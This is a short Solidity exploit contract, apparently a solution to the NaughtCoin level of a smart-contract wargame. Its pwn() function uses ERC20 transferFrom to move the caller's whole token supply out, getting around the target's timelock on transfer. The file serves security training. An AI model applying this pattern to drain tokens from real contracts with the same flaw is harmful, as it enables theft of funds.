// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/nautcoin.sol';
import 'OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/ERC20.sol';


 contract AttackNaughtCoin {

    NaughtCoin target;
    constructor (address _target) {
        target = NaughtCoin(_target);
    }

    function pwn() public {
        target.transferFrom(msg.sender,address(this),target.INITIAL_SUPPLY());
    }

    
 }  